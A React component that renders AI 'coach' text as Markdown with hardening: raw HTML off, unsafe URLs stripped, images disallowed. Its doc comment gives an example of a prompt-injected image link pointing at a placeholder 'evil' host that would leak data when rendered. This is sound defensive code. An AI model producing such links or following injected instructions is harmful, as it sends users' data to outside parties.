import ReactMarkdown from "react-markdown";

/**
 * Renders coach text. Raw HTML is not rendered, and react-markdown's default urlTransform stays in
 * place so javascript: and other unsafe URLs are stripped (R17c). Images are dropped: a prompt-injected
 * `![x](https://evil/?d=…)` would otherwise send data to a third party as soon as it renders.
 */
export function Markdown({ children }: { children: string }) {
  return (
    <div className="flex flex-col gap-2 [&_a]:underline [&_ol]:list-decimal [&_ol]:pl-5 [&_ul]:list-disc [&_ul]:pl-5">
      <ReactMarkdown
        disallowedElements={["img"]}
        components={{
          a: ({ node: _node, ...props }) => (
            <a {...props} target="_blank" rel="noopener noreferrer" />
          ),
        }}
      >
        {children}
      </ReactMarkdown>
    </div>
  );
}
